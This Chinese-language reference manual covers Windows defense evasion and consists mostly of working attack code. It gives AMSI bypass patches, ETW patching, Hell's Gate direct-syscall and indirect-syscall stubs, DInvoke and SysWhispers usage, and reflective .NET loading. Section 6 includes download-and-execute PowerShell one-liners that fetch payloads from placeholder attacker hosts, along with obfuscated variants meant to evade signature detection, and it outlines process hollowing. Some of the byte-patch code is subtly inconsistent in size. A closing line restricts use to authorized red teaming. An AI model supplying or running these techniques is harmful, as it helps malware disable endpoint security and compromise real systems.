# 高级规避技术实战参考

> 覆盖: AMSI Bypass → ETW Patch → Syscall直接调用 → EDR用户态钩子绕过 → 间接syscall → .NET反射加载
> 定位: 与 SecSkills-main 互补。SecSkills 覆盖基础免杀(Shellcode混淆)，本文件覆盖 Windows EDR规避

---

## 1. AMSI Bypass (PowerShell)

### 1.1 AMSI 原理

```
AMSI (Anti-Malware Scan Interface) — Windows 10/11 + Server 2016+
工作位置: PowerShell / VBScript / JScript / VBA / .NET
检测方式: 脚本内容 → AMSI Provider → Defender/第三方AV

绕过本质: 阻止脚本内容到达扫描器 或 使扫描器返回"干净"
```

### 1.2 内存补丁 (AmsiScanBuffer)

```powershell
# 最通用的 AMSI Bypass — Patch AmsiScanBuffer 返回 AMSI_RESULT_CLEAN

# 方法1: 偏移硬编码 (Win10 常见版本)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法2: 内存 Patch (C#)
$amsiBypass = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr p, UIntPtr s, uint f, out uint l);

    public static void Bypass() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr ptr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(ptr, (UIntPtr)5, 0x40, out old);
        // mov eax, 1; ret (返回AMSI_RESULT_CLEAN)
        Marshal.WriteByte(ptr, 0xB8);
        Marshal.WriteByte(ptr+1, 0x01);
        Marshal.WriteByte(ptr+2, 0x00);
        Marshal.WriteByte(ptr+3, 0x00);
        Marshal.WriteByte(ptr+4, 0x00);
        Marshal.WriteByte(ptr+5, 0xC3);
        VirtualProtect(ptr, (UIntPtr)5, old, out old);
    }
}
'@
Add-Type $amsiBypass
[Amsi]::Bypass()

# 验证
# 这行不再被拦截
Invoke-Expression "Invoke-Expression 'AMSI Bypassed'"
```

### 1.3 注册表禁用

```powershell
# 如果当前用户有 HKCU 写入权限
# Win10 1809+ 支持 per-user AMSI 配置
New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -Type DWord

# HKLM (需要管理员)
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
```

### 1.4 PowerShell 降级

```powershell
# 降级到 PowerShell v2 (无 AMSI)
powershell -Version 2 -Command "Write-Host 'No AMSI here'"
# 注意: PSv2 默认未安装于 Win10 1709+

# 使用 CLR Hosting (绕过 AMSI)
# 通过 C# 创建自定义 PowerShell Runspace
$runspace = [RunspaceFactory]::CreateRunspace()
$runspace.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $runspace
$ps.AddScript("Write-Host 'Bypassed AMSI'").Invoke()
```

### 1.5 字符串混淆 (基础)

```powershell
# 绕过基于签名的 AMSI 检测
# 1. Base64 编码
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlLUV4cHJlc3Npb24gJ0FNU0kgQnlwYXNzZWQn"))
Invoke-Expression $cmd

# 2. 字符拼接
$c1 = "Inv"
$c2 = "oke"
$c3 = "-Ex"
$c4 = "pre"
$c5 = "ssion"
$c6 = " '"
$c7 = "test'"
& ([ScriptBlock]::Create($c1+$c2+$c3+$c4+$c5+" "+$c6+$c7))

# 3. XOR 编码
$key = 0x42
$enc = [byte[]]@(0x2B,0x2D,0x2E,0x24,0x27,0x36,0x2A,0x22,0x20,0x28)
$dec = -join ($enc | % { [char]($_ -bxor $key) })
Invoke-Expression $dec
```

---

## 2. ETW Patch (Event Tracing for Windows)

### 2.1 ETW 原理

```
ETW — Windows 事件跟踪
.NET Assembly Load / PowerShell pipeline / 网络连接 等事件
事件 → ETW Provider → ETW Session → ETW Consumer (如 Sysmon/EDR)

绕过原理: 禁用/修改 ETW Provider 的 EventWrite 函数
使 EDR 无法收集事件
```

### 2.2 ETW .NET Provider Patch

```powershell
# Patch clr.dll!EtwEventWrite 或 ntdll!EtwEventWrite
$etwBypass = @'
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr p, UIntPtr s, uint f, out uint l);

    public static void PatchNet() {
        IntPtr lib = LoadLibrary("clr.dll");
        IntPtr ptr = GetProcAddress(lib, "EtwEventWrite");
        if (ptr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(ptr, (UIntPtr)2, 0x40, out old);
        // ret early (xor eax, eax; ret)
        Marshal.WriteByte(ptr, 0x31);
        Marshal.WriteByte(ptr+1, 0xC0);
        Marshal.WriteByte(ptr+2, 0xC3);
    }

    public static void PatchNtdll() {
        IntPtr lib = LoadLibrary("ntdll.dll");
        IntPtr ptr = GetProcAddress(lib, "EtwEventWrite");
        if (ptr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(ptr, (UIntPtr)2, 0x40, out old);
        Marshal.WriteByte(ptr, 0xC3);  // ret
        VirtualProtect(ptr, (UIntPtr)2, old, out old);
    }
}
'@
Add-Type $etwBypass
[Etw]::PatchNet()
[Etw]::PatchNtdll()
```

### 2.3 ETW 流量分析

```bash
# 查看 ETW 追踪器
logman query -ets

# 禁用特定 ETW Provider (需管理员)
logman stop <SESSION_NAME> -ets

# 常用的 EDR ETW Provider:
# Microsoft-Windows-Sysmon
# Microsoft-Windows-Kernel-Process
# Microsoft-Windows-DotNETRuntime
```

---

## 3. Syscall 直接调用 (Hell's Gate / Halo's Gate)

### 3.1 原理

```
正常流程: 用户态 → ntdll!NtXxx (被 EDR 钩子) → syscall → 内核

EDR 钩子位置: ntdll.dll 的系统调用函数前 5-16 字节 (jmp/hook)

绕过: 直接获取 syscall number → 不经过 ntdll 的被钩函数
      → 调用 syscall 指令直接进内核
```

### 3.2 Hell's Gate — 直接 Syscall (C)

```c
// Hell's Gate — 从 ntdll 中提取 syscall number
// 即使 ntdll 被钩子，系统调用号不变

#include <windows.h>
#include <stdio.h>

// 定义需要调用的系统函数结构
typedef struct _SYSCALL_INFO {
    DWORD  Number;    // Syscall number
    BYTE   Instruction[2]; // 0F 05 (syscall)
} SYSCALL_INFO;

// 从 ntdll 中提取 syscall number
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC func = GetProcAddress(ntdll, functionName);
    BYTE* ptr = (BYTE*)func;
    
    // ntdll!NtXxx:
    // mov r10, rcx     (4C 8B D1)    ← EDR 钩子之后才开始原始指令
    // mov eax, SSN     (B8 XX XX XX XX)
    // syscall          (0F 05)
    
    // 跳过可能的 EDR 钩子 (寻找 mov eax, SSN 模式)
    for (int i = 0; i < 32; i++) {
        if (ptr[i] == 0xB8) {  // mov eax, imm32
            return *(DWORD*)&ptr[i+1];
        }
    }
    return 0;
}

void HellGateExample() {
    DWORD ssn = GetSyscallNumber("NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory SSN: 0x%x\n", ssn);
    
    // 使用汇编执行 syscall
    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}
```

### 3.3 Halo's Gate — 处理钩子污染

```c
// Halo's Gate — 当 ntdll 中的系统调用号本身被修改时
// 遍历相邻系统调用，通过未钩子函数推断正确 SSN

// 原理: 系统调用号是连续的
// NtXxx → SSN 0xXX
// NtYyy → SSN 0xYY (相邻)
// 如果 0xXX 被污染，从 0xYY - 1 得出正确值

DWORD GetCleanSyscallNumber(const char* target) {
    // 查找目标函数地址
    // 从目标地址偏移 -32 到 +32 扫描相邻 ntdll 函数
    // 对于每个找到的 ntdll 函数：
    //   1. 检查前 5 字节是否是钩子 (jmp rel32 = E9)
    //   2. 如果不是钩子 → 提取其 SSN
    //   3. 根据偏移量推算目标 SSN = 相邻SSN ± 偏移
    // 返回推算出的 SSN
}
```

### 3.4 使用汇编执行 Syscall (MASM/x64)

```asm
; syscall.asm — 独立的 syscall 存根
; fasm / nasm / masm
.code
NtCreateProcess PROC
    mov r10, rcx
    mov eax, SSN_NtCreateProcess  ; 动态获取 SSN
    syscall
    ret
NtCreateProcess ENDP
END
```

---

## 4. EDR 用户态钩子检测与绕过

### 4.1 检测 ntdll 钩子

```c
// 检测 ntdll 是否被 EDR 钩子
#include <windows.h>
#include <stdio.h>

void DetectHooks() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dos->e_lfanew);
    
    // 遍历导出表
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    DWORD* names = (DWORD*)((BYTE*)ntdll + exports->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)ntdll + exports->AddressOfFunctions);
    
    for (int i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)ntdll + names[i]);
        if (strncmp(name, "Nt", 2) == 0) {
            BYTE* func = (BYTE*)((BYTE*)ntdll + funcs[i]);
            // 检查前 2 字节: 正常 ntdll 为 4C 8B (mov r10, rcx)
            // EDR 钩子通常为: E9 xx xx xx xx (jmp) 或 FF 25 xx xx xx xx (jmp [])
            if (func[0] == 0xE9 || func[0] == 0xEB || func[0] == 0xFF) {
                printf("[HOOKED] %s at %p\n", name, func);
            }
        }
    }
}
```

### 4.2 绕过钩子 — 间接 Syscall

```c
// 间接 syscall — 在干净的内存区域创建 syscall 存根
// 避免调用 ntdll 中被钩的函数

// 步骤:
// 1. 从 ntdll 提取 SSN
// 2. 分配可执行内存 (VirtualAlloc)
// 3. 将 syscall 存根写入该内存
//    mov r10, rcx
//    mov eax, <SSN>
//    syscall
//    ret
// 4. 通过函数指针调用

void* CreateSyscallStub(DWORD ssn) {
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, SSN
        0x0F, 0x05,                   // syscall
        0xC3                          // ret
    };
    *(DWORD*)&stub[4] = ssn;
    
    void* exec = VirtualAlloc(NULL, sizeof(stub), 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, stub, sizeof(stub));
    return exec;
}
```

### 4.3 PowerShell 检测钩子

```powershell
# 检测 ntdll 前 5 字节是否被钩子
$ntdll = [System.Reflection.Assembly]::Load('System')
$ntdll_ptr = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.Reflection.Module]::LoadWithPartialName('ntdll.dll')
)
# 通过 GetProcAddress 获取特定函数
function Test-NtFunction {
    param($FuncName)
    $lib = [System.Runtime.InteropServices.NativeLibrary]::Load("ntdll.dll")
    $ptr = [System.Runtime.InteropServices.NativeLibrary]::GetExport($lib, $FuncName)
    $bytes = New-Object byte[] 5
    [System.Runtime.InteropServices.Marshal]::Copy($ptr, $bytes, 0, 5)
    
    if ($bytes[0] -eq 0xE9) {
        Write-Warning "$FuncName is HOOKED (jmp rel32)"
        return $true
    }
    return $false
}

# 检查常见系统调用
Test-NtFunction "NtOpenProcess"
Test-NtFunction "NtCreateThreadEx"
Test-NtFunction "NtAllocateVirtualMemory"
```

---

## 5. 间接 Syscall (DInvoke / SharpSploit)

### 5.1 DInvoke 动态调用

```csharp
// DInvoke — .NET 动态调用未导出函数
// 使用 D/Invoke 替代 P/Invoke 绕过某些检测

// 核心方法: 通过 GetProcAddress 获取 ntdll 函数地址
// 然后手动构造调用栈 (绕过 P/Invoke 的日志)

// 使用 SharpSploit 库 (C#)
// NuGet: SharpSploit
using SharpSploit.Execution;

// DInvoke 执行系统调用
public static class Syscalls {
    public static NTSTATUS NtCreateProcess(
        out IntPtr ProcessHandle,
        ACCESS_MASK DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        IntPtr ParentProcess,
        bool InheritObjectTableHandles,
        IntPtr SectionHandle,
        IntPtr DebugPort,
        IntPtr ExceptionPort,
        uint CreateFlags
    ) {
        // SharpSploit 封装了 SSN 提取和间接 syscall
        return DynamicInvoke.Generic.DynamicAPIInvoke(
            "ntdll.dll", "NtCreateProcess",
            typeof(NtCreateProcessDelegate),
            new object[] {
                ProcessHandle, DesiredAccess, ObjectAttributes,
                ParentProcess, InheritObjectTableHandles,
                SectionHandle, DebugPort, ExceptionPort, CreateFlags
            }
        );
    }
}
```

### 5.2 SysWhispers 直接 syscall

```c
// SysWhispers — 生成 syscall 存根代码
// 项目: https://github.com/jthuraisamy/SysWhispers

// 1. 生成 syscall 存根:
// python3 syswhispers.py --functions NtCreateProcess,NtOpenProcess,NtAllocateVirtualMemory --output syscalls

// 2. 生成的 syscall.asm:
.code
NtCreateProcess PROC
    mov r10, rcx
    mov eax, 0C3h  ; SSN
    syscall
    ret
NtCreateProcess ENDP

// 3. C 代码调用:
extern "C" NTSTATUS NtCreateProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    BOOLEAN InheritObjectTableHandles,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG CreateFlags
);

void example() {
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    
    NTSTATUS status = NtCreateProcess(
        &hProcess, PROCESS_ALL_ACCESS, &oa,
        GetCurrentProcess(), FALSE, NULL, NULL, NULL, 0
    );
}
```

### 5.3 调用栈欺骗

```c
// EDR 检测: 用户态调用的返回地址链
// 如果 syscall 直接来自 .text 节 → 可疑

// 绕过: 创建合法的调用栈
// 1. 调用 KernelBase!VirtualAlloc (正常 API)
// 2. API 内部调用 ntdll!NtAllocateVirtualMemory
// 3. 返回地址链: 用户代码 → kernel32 → ntdll (看起来正常)

// 更复杂的: 通过 trampoline 创建合法链
// 调用 Return Address Spoofing 手法
```

---

## 6. .NET 程序集反射加载

### 6.1 从字节数组加载

```powershell
# 反射加载 .NET 程序集 (绕过文件扫描)
$bytes = (Invoke-WebRequest "http://<EVIL_SERVER>/payload.dll").Content
[System.Reflection.Assembly]::Load($bytes)

# 或从 Base64
$b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAA..."
$bytes = [Convert]::FromBase64String($b64)
[System.Reflection.Assembly]::Load($bytes)

# 执行
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.GetType("Payload.Class").GetMethod("Run").Invoke($null, $null)
```

### 6.2 无文件加载 (Reflection + Delegate)

```csharp
// C# — 从字节加载并调用无类型反射
byte[] payload = DownloadPayload();
Assembly asm = Assembly.Load(payload);

// 查找入口点
foreach (Type type in asm.GetExportedTypes()) {
    foreach (MethodInfo method in type.GetMethods(
        BindingFlags.Static | BindingFlags.Public)) {
        if (method.Name == "Main" || method.Name == "Execute") {
            method.Invoke(null, new object[] { 
                new string[] { "arg1", "arg2" } 
            });
            return;
        }
    }
}
```

### 6.3 PowerShell 远程下载执行

```powershell
# 经典 one-liner (已被签名检测)
powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://<EVIL>/payload.ps1')"

# 绕过签名检测
# 方法1: 字符拆分
$url = "http://<EVIL>/payload.ps1"
$wc = New-Object Net.WebClient
[ScriptBlock]::Create($wc.DownloadString($url)).Invoke()

# 方法2: 使用 Net.WebRequest
$req = [Net.WebRequest]::Create("http://<EVIL>/payload.ps1")
$resp = $req.GetResponse()
$stream = $resp.GetResponseStream()
$reader = New-Object IO.StreamReader($stream)
IEX $reader.ReadToEnd()

# 方法3: 使用 XMLHTTP (COM 对象)
$xml = New-Object -ComObject Msxml2.XMLHTTP
$xml.open("GET", "http://<EVIL>/payload.ps1", $false)
$xml.send()
IEX $xml.responseText
```

### 6.4 .NET Remoting / Named Pipe

```csharp
// 通过 Named Pipe 加载 payload
// 服务端: BSSP (Bouncy Shell) 工具
// 客户端: 反射加载 Pipeline

// Process Hollowing — 替换进程内存
// 1. 以挂起方式创建合法进程 (notepad.exe)
// 2. 卸载原始内存
// 3. 写入恶意 payload
// 4. SetThreadContext + ResumeThread

// 这种方式绕过 EDR 基于模块签名的检测
// 因为合法进程在 EDR 视图中仍然是 notepad.exe
```

---

## 速查表

| 技术 | 适用场景 | EDR 可见性 |
|------|---------|-----------|
| AMSI Bypass (patch) | PowerShell 执行 | 低 (patch 后) |
| AMSI Bypass (PSv2) | 降级运行 | 中 (PSv2 可能不存在) |
| ETW Patch | .NET 程序集加载 | 中 (需管理员?) |
| Hell's Gate SSN | 直接 syscall | 低 |
| 间接 Syscall | 绕过 EDR 钩子 | 低-中 |
| DInvoke | .NET 动态调用 | 中 |
| SysWhispers | 免杀 loader | 低 |
| 调用栈欺骗 | 避免返回地址检测 | 低 |
| 反射加载 | 无文件执行 | 中 (内存扫描) |
| Process Hollowing | 进程替换 | 中-高 |

---

*参考: github.com/jthuraisamy/SysWhispers, github.com/TheWover/DInvoke, github.com/cobbr/SharpSploit*
*警告: 上述技术仅用于授权红队/渗透测试，未经授权使用可能违法*
